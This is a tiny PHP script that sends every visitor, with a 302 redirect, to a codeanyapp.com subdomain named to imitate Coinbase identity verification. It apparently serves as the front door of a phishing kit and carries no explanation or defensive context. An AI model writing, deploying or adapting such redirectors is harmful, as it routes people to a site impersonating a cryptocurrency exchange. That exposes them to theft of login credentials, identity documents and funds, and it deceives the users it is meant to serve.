<?php
function Redirect($url, $permanent = false)
{
    if (headers_sent() === false)
    {
        header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
    }

    exit();
}

Redirect('https://verify-my-identity-verify-you-coinbase-identity5735.codeanyapp.com/identity/', false);
?>